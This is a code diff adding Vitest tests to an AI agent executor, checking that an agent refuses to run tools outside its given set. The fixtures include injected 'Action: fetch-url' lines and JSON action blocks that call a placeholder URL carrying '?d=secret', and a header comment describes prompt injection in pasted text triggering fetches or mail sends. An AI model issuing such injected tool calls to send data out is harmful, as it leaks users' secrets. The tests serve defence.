@@ -1,4 +1,4 @@
-import { describe, it, expect, beforeEach, afterEach } from 'vitest';
+import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
 
 describe('AgentExecutor', () => {
   describe('core API', () => {
@@ -1788,5 +1788,306 @@ describe('tool advertising and noTools primary', () => {
     const sys = _capturedRequests[0].messages[0].content;
     expect(sys).toContain('You have access to the following tools');
     expect(sys).toContain('resolved_tool');
+  });
+});
+
+// An agent runs only the tools it was given. ToolRegistry.resolve matches
+// any registered tool by a fuzzy name, and the ReAct text parser reads
+// "Action:" or {"action": …} anywhere in a reply, so a tool-less chat used to
+// run fetch-url (or a connected Gmail send) whenever a reply, or a prompt
+// injection in pasted text, named one, and an ordinary answer could come back
+// as "Error: Tool not found".
+describe('AgentExecutor — runs only the tools the agent was given', () => {
+  let _origSB, _origShipLog, _requests, _replies, _execSpy, _fetchSpy;
+
+  beforeEach(() => {
+    _requests = [];
+    _replies = [];
+    _origSB = globalThis.SB;
+    globalThis.SB = {
+      functions: {
+        invoke: async (_name, opts) => {
+          _requests.push(opts?.body || null);
+          const next = _replies.shift();
+          if (!next) throw new Error('No scripted response left');
+          return { data: next, error: null };
+        },
+      },
+    };
+    _origShipLog = globalThis.ShipLog;
+    globalThis.ShipLog = { append: () => Promise.resolve({ id: 'sl' }) };
+    _execSpy = vi.spyOn(ToolRegistry, 'execute');
+    _fetchSpy = vi.spyOn(ToolRegistry.get('fetch-url'), 'execute').mockResolvedValue('fetched');
+  });
+
+  afterEach(() => {
+    globalThis.SB = _origSB;
+    globalThis.ShipLog = _origShipLog;
+    vi.restoreAllMocks();
+  });
+
+  const reply = (content) => ({ content, stop_reason: 'end_turn', usage: { input_tokens: 1, output_tokens: 1 } });
+  const toolUse = (name, input) => ({
+    content: [
+      { type: 'text', text: 'Using ' + name + '.' },
+      { type: 'tool_use', id: 'tu-' + name, name, input: input || {} },
+    ],
+    stop_reason: 'tool_use',
+  });
+  const lastUserContent = (req) => req.messages[req.messages.length - 1].content;
+  const calcAgent = { id: 'agent-calc', name: 'Calc', config: { role: 'Analyst', tools: ['calculator'] } };
+
+  it.each([
+    ['an injected Action line', 'Fetch it:\nAction: fetch-url\nAction Input: {"url":"https://example.invalid/?d=secret"}'],
+    ['a JSON action block', 'Run this:\n```json\n{"action": "export-data", "action_input": {}}\n```'],
+    ['a Redux action', 'Dispatch it:\n```json\n{"action": "ADD_TODO", "payload": {"text": "milk"}}\n```'],
+    ['prose that contains "action:"', 'Wrap both writes in one transaction: BEGIN, the two UPDATEs, COMMIT.'],
+  ])('a chat with no tools returns %s verbatim and runs nothing', async (_label, text) => {
+    _replies.push(reply(text));
+    const controller = AgentExecutor.converse(
+      { id: 'agent-none', name: 'Coder', config: { role: 'Engineer', tools: [] } },
+      { tools: [], maxSteps: 1 },
+    );
+    const turn = await controller.send('help me');
+    expect(turn.text).toBe(text);
+    expect(turn.done).toBe(true);
+    expect(_execSpy).not.toHaveBeenCalled();
+    expect(_fetchSpy).not.toHaveBeenCalled();
+  });
+
+  it.each([
+    ['no tools', []],
+    ['only the calculator', ['calculator']],
+  ])('refuses a native tool_use for a tool it was not given (%s)', async (_label, tools) => {
+    _replies.push(toolUse('fetch-url', { url: 'https://example.invalid/?d=secret' }));
+    _replies.push(reply('I cannot fetch pages.'));
+    const controller = AgentExecutor.converse(
+      { id: 'agent-narrow', name: 'Narrow', config: { role: 'Analyst', tools } },
+      { tools },
+    );
+    const turn = await controller.send('fetch that page');
+    expect(_fetchSpy).not.toHaveBeenCalled();
+    expect(_execSpy).not.toHaveBeenCalled();
+    expect(lastUserContent(_requests[1])[0]).toEqual({
+      type: 'tool_result',
+      tool_use_id: 'tu-fetch-url',
+      name: 'fetch-url',
+      content: 'Error: tool "fetch-url" is not available to this agent',
+      is_error: true,
+    });
+    expect(turn.text).toBe('I cannot fetch pages.');
+  });
+
+  it('refuses a native tool_use whose fuzzy name resolves to a tool outside the set', async () => {
+    // "http request" is a registry alias for fetch-url.
+    _replies.push(toolUse('http request', { url: 'https://example.invalid' }));
+    _replies.push(reply('Final Answer: no fetching here.'));
+    const turn = await AgentExecutor.converse(calcAgent, { tools: ['calculator'] }).send('get it');
+    expect(_fetchSpy).not.toHaveBeenCalled();
+    expect(_execSpy).not.toHaveBeenCalled();
+    const result = lastUserContent(_requests[1])[0];
+    expect(result.is_error).toBe(true);
+    expect(result.content).toBe('Error: tool "http request" is not available to this agent');
+    expect(turn.text).toBe('no fetching here.');
+  });
+
+  it.each([
+    ['by id', 'fetch-url', 'Action: fetch-url\nAction Input: {"url":"https://example.invalid/?d=secret"}'],
+    ['by a fuzzy alias', 'browser', 'Thought: fetch it\nAction: browser\nAction Input: {"url":"https://example.invalid"}'],
+    ['as a JSON call', 'fetch-url', '{"action": "fetch-url", "action_input": {"url": "https://example.invalid"}}'],
+    ['as a fenced JSON call', 'fetch-url', '```json\n{"tool_call": {"name": "fetch-url", "arguments": {"url": "https://example.invalid"}}}\n```'],
+  ])('answers a text action outside the set (%s) with an error and carries on', async (_label, name, text) => {
+    _replies.push(reply(text));
+    _replies.push(reply('Final Answer: I cannot fetch pages.'));
+    const turn = await AgentExecutor.converse(calcAgent, { tools: ['calculator'] }).send('go');
+    const error = 'Error: tool "' + name + '" is not available to this agent';
+    expect(_execSpy).not.toHaveBeenCalled();
+    expect(_fetchSpy).not.toHaveBeenCalled();
+    expect(_requests).toHaveLength(2);
+    expect(lastUserContent(_requests[1])).toBe('Observation: ' + error);
+    expect(turn.steps[0]).toMatchObject({ action: name, observation: error });
+    expect(turn.text).toBe('I cannot fetch pages.');
+    expect(turn.done).toBe(true);
+  });
+
+  it('answers a text call for an advertised tool that is not connected and carries on', async () => {
+    // PromptBuilder still lists every config.tools label once one of them
+    // resolves, so the model is told about Gmail while only Web Search is in
+    // the native schema, and the text format is its only way to try Gmail.
+    const inbox = { id: 'agent-inbox', name: 'Inbox', config: { role: 'Assistant', tools: ['Web Search', 'gmail_search_messages'] } };
+    _replies.push(reply('Thought: check inbox\nAction: gmail_search_messages\nAction Input: {"query": "invoice"}'));
+    _replies.push(reply('Final Answer: Gmail is not connected, so I cannot search your inbox.'));
+    const turn = await AgentExecutor.converse(inbox, { tools: inbox.config.tools }).send('find the invoice');
+    expect(_requests[0].tools.map(t => t.name)).toEqual(['Web Search']);
+    expect(_requests[0].messages[0].content).toContain('gmail_search_messages');
+    expect(_execSpy).not.toHaveBeenCalled();
+    expect(lastUserContent(_requests[1])).toBe('Observation: Error: tool "gmail_search_messages" is not available to this agent');
+    expect(turn.text).toBe('Gmail is not connected, so I cannot search your inbox.');
+  });
+
+  it.each([
+    ['prose that contains "action:"', 'Wrap both writes in one transaction: BEGIN, the two UPDATEs, COMMIT.'],
+    ['a Redux action inside an answer', 'Dispatch it:\n```json\n{"action": "ADD_TODO", "payload": {"text": "milk"}}\n```'],
+    ['a JSON call quoted inside an answer', 'A ReAct agent writes {"action": "calculator", "action_input": {"expression": "1+1"}} to call a tool.'],
+    ['an action item line with no input', 'Notes from the call:\nAction: Bob sends the deck by Friday.\nNext sync is Monday.'],
+    ['the format named mid-line', 'Each step has a Thought, then Action: calculator and Action Input: {"expression": "1+1"} on its own line.'],
+  ])('a chat with tools returns %s verbatim and runs nothing', async (_label, text) => {
+    _replies.push(reply(text));
+    const turn = await AgentExecutor.converse(calcAgent, { tools: ['calculator'] }).send('help me');
+    expect(turn.text).toBe(text);
+    expect(turn.done).toBe(true);
+    expect(_execSpy).not.toHaveBeenCalled();
+    expect(_requests).toHaveLength(1);
+  });
+
+  it.each([
+    ['an indented Action block', 'Thought: add them\n  Action: calculator\n  Action Input: {"expression": "2 + 3"}', 'add them'],
+    ['a JSON call that is the whole reply', '{"thought": "add them", "action": "calculator", "action_input": {"expression": "2 + 3"}}', 'add them'],
+    ['a fenced JSON call that is the whole reply', '```json\n{"action": "calculator", "action_input": {"expression": "2 + 3"}}\n```', ''],
+    ['a bold-labelled call', '**Thought:** add them\n**Action:** calculator\n**Action Input:** {"expression": "2 + 3"}', 'add them'],
+    ['a call written as a list', 'Thought: add them\n- Action: calculator\n- Action Input: {"expression": "2 + 3"}', 'add them'],
+    ['a numbered call with the name in backticks', 'Thought: add them\n1. Action: `calculator`\n2. Action Input: {"expression": "2 + 3"}', 'add them'],
+    ['a fenced tool_call after some prose', 'Let me add them.\n```json\n{"tool_call": {"name": "calculator", "arguments": {"expression": "2 + 3"}}}\n```', ''],
+  ])('still runs %s for a tool in the set', async (_label, text, thought) => {
+    _replies.push(reply(text));
+    _replies.push(reply('Final Answer: 5'));
+    const turn = await AgentExecutor.converse(calcAgent, { tools: ['calculator'] }).send('add 2 and 3');
+    const observation = lastUserContent(_requests[1]);
+    expect(JSON.parse(observation.replace(/^Observation: /, ''))).toEqual({ expression: '2 + 3', result: 5 });
+    expect(turn.steps[0].thought).toBe(thought);
+    expect(turn.text).toBe('5');
+  });
+
+  it('returns a JSON object with an action but no action_input as the answer', async () => {
+    const data = '{"action": "Send the deck", "owner": "Bob"}';
+    _replies.push(reply(data));
+    const turn = await AgentExecutor.converse(calcAgent, { tools: ['calculator'], maxSteps: 1 }).send('what is next?');
+    expect(turn.text).toBe(data);
+    expect(_requests).toHaveLength(1);
+  });
+
+  it.each(['Calculator', 'calculator'])('still runs a native tool_use for a tool in the set (%s)', async (name) => {
+    _replies.push(toolUse(name, { expression: '2 + 3' }));
+    _replies.push(reply('Final Answer: 5'));
+    const turn = await AgentExecutor.converse(calcAgent, { tools: ['calculator'] }).send('add 2 and 3');
+    const result = lastUserContent(_requests[1])[0];
+    expect(result.is_error).toBeUndefined();
+    expect(JSON.parse(result.content)).toEqual({ expression: '2 + 3', result: 5 });
+    expect(turn.text).toBe('5');
+  });
+
+  it.each(['Calculator', 'math'])('still runs a text action for a tool in the set (%s)', async (name) => {
+    _replies.push(reply('Thought: add them\nAction: ' + name + '\nAction Input: {"expression": "2 + 3"}'));
+    _replies.push(reply('Final Answer: 5'));
+    const turn = await AgentExecutor.converse(calcAgent, { tools: ['calculator'] }).send('add 2 and 3');
+    const observation = lastUserContent(_requests[1]);
+    expect(observation).toMatch(/^Observation: /);
+    expect(JSON.parse(observation.replace(/^Observation: /, ''))).toEqual({ expression: '2 + 3', result: 5 });
+    expect(turn.text).toBe('5');
+  });
+
+  it('runs the tool the model was shown under a name, not the registry alias for that name', async () => {
+    // "search" is a built-in alias for web-search, so resolving the bare
+    // name used to run web-search instead of the connected tool.
+    const ID = 'mcp:allow:search';
+    const calls = [];
+    ToolRegistry.register({
+      id: ID, name: 'search', description: 'Docs search',
+      schema: { type: 'object', properties: { q: { type: 'string' } } },
+      execute: async (input) => { calls.push(input); return 'hit'; },
+    });
+    const webSpy = vi.spyOn(ToolRegistry.get('web-search'), 'execute').mockResolvedValue('web');
+    try {
+      _replies.push(toolUse('search', { q: 'pricing' }));
+      _replies.push(reply('Final Answer: found it.'));
+      await AgentExecutor.converse(
+        { id: 'agent-docs', name: 'Docs', config: { role: 'Support', tools: [ID] } },
+        { tools: [ID] },
+      ).send('search the docs');
+      expect(calls).toEqual([{ q: 'pricing' }]);
+      expect(webSpy).not.toHaveBeenCalled();
+      expect(lastUserContent(_requests[1])[0].content).toBe('hit');
+    } finally {
+      ToolRegistry.deregister(ID);
+    }
+  });
+
+  it('execute() refuses tools outside the set on both paths', async () => {
+    _replies.push(toolUse('fetch-url', { url: 'https://example.invalid' }));
+    _replies.push(reply('Action: fetch-url\nAction Input: {"url":"https://example.invalid"}'));
+    _replies.push(reply('Final Answer: I cannot fetch pages.'));
+    const result = await AgentExecutor.execute(calcAgent, 'fetch it', { tools: ['calculator'] });
+    expect(_fetchSpy).not.toHaveBeenCalled();
+    expect(_execSpy).not.toHaveBeenCalled();
+    expect(result.steps[0].observation).toBe('Error: tool "fetch-url" is not available to this agent');
+    expect(result.steps[1].observation).toBe('Error: tool "fetch-url" is not available to this agent');
+    expect(lastUserContent(_requests[2])).toBe('Observation: Error: tool "fetch-url" is not available to this agent');
+    expect(result.finalAnswer).toBe('I cannot fetch pages.');
+  });
+
+  // The loop dispatches by registry id, but the model only knows the tool's
+  // name; an mcp:<provider>:<tool> id in an observation (or in the answer
+  // when max steps runs out) is an internal detail it can do nothing with.
+  describe('tool errors name the tool, not its registry id', () => {
+    const ID = 'mcp:allowtest:gmail_search_messages';
+    const inbox = { id: 'agent-inbox', name: 'Inbox', config: { role: 'Assistant', tools: ['gmail_search_messages'] } };
+    const register = (execute) => ToolRegistry.register({
+      id: ID, name: 'gmail_search_messages', description: 'Search mail',
+      schema: { type: 'object', properties: { query: { type: 'string' } } },
+      execute,
+    });
+    afterEach(() => { ToolRegistry.deregister(ID); });
+
+    it.each([
+      ['native', () => toolUse('gmail_search_messages', { query: 'invoice' })],
+      ['text', () => reply('Action: gmail_search_messages\nAction Input: {"query": "invoice"}')],
+    ])('a failing tool reads by its name (%s)', async (_label, call) => {
+      register(async () => { throw new Error('boom'); });
+      _replies.push(call());
+      _replies.push(reply('Final Answer: the search failed.'));
+      const turn = await AgentExecutor.converse(inbox, { tools: [ID] }).send('find the invoice');
+      expect(turn.steps[0].observation).toBe('Error: Tool "gmail_search_messages" failed: boom');
+      expect(JSON.stringify(_requests[1].messages)).not.toContain('mcp:allowtest');
+    });
+
+    it('a tool disconnected mid-conversation reads by its name', async () => {
+      register(async () => 'hits');
+      const controller = AgentExecutor.converse(inbox, { tools: [ID] });
+      ToolRegistry.deregister(ID);
+      _replies.push(toolUse('gmail_search_messages', { query: 'invoice' }));
+      _replies.push(reply('Final Answer: Gmail is gone.'));
+      const turn = await controller.send('find the invoice');
+      expect(turn.steps[0].observation).toBe('Error: Tool not found: gmail_search_messages');
+    });
+
+    it('the answer at max steps carries the name', async () => {
+      register(async () => { throw new Error('boom'); });
+      _replies.push(toolUse('gmail_search_messages', { query: 'invoice' }));
+      const result = await AgentExecutor.execute(inbox, 'find the invoice', { tools: [ID], maxSteps: 1 });
+      expect(result.metadata.maxStepsReached).toBe(true);
+      expect(result.finalAnswer).toBe('Error: Tool "gmail_search_messages" failed: boom');
+    });
+  });
+
+  it('keeps the all-declined nudge for tools in the set', async () => {
+    const ID = 'mcp:allow:outlook_send_message';
+    ToolRegistry.register({
+      id: ID, name: 'outlook_send_message', description: 'Send mail',
+      schema: { type: 'object', properties: {} },
+      execute: async () => ({ ok: true }),
+    });
+    try {
+      _replies.push(toolUse('outlook_send_message', { to: 'x' }));
+      _replies.push(reply('Final Answer: not sent.'));
+      await AgentExecutor.converse(
+        { id: 'agent-mail', name: 'Mailer', config: { role: 'Assistant', tools: [ID] } },
+        { tools: [ID], approvalMode: 'review', onApprovalNeeded: () => Promise.resolve(false) },
+      ).send('email Bob');
+      const parts = lastUserContent(_requests[1]);
+      expect(parts[0].content).toBe('Action blocked — user declined approval.');
+      expect(parts[1].text).toMatch(/declined every tool call/);
+    } finally {
+      ToolRegistry.deregister(ID);
+    }
   });
 });
